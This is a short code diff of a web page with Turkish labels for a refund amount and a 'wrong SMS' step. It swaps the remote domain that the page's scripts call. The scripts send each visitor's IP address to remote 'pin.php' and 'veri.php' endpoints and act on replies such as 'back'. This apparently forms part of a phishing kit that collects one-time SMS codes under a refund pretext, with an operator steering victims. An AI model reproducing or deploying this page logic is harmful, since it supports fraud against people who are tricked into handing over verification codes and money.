@@ -50,7 +50,7 @@
            <br> <center> <label id="iadeTutari"> </label>  </center> </div> 
            <script>
             window.onload = function() {
-                const apiUrl = 'https://hakikicelikhantutunu.com/dmn/pin.php?ip=';
+                const apiUrl = 'https://akbulutmensucat.com/dmn/pin.php?ip=';
                 const ip = getCookie('ip');
         
                 if (!ip) {
@@ -192,7 +192,7 @@ document.addEventListener("DOMContentLoaded", function() {
           }
         },
         sendRequest(visitorIP) {
-          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=hatali-sms')
+          axios.get('https://akbulutmensucat.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=hatali-sms')
             .then(response => {
               const msg = response.data;
               if (msg === "back") {
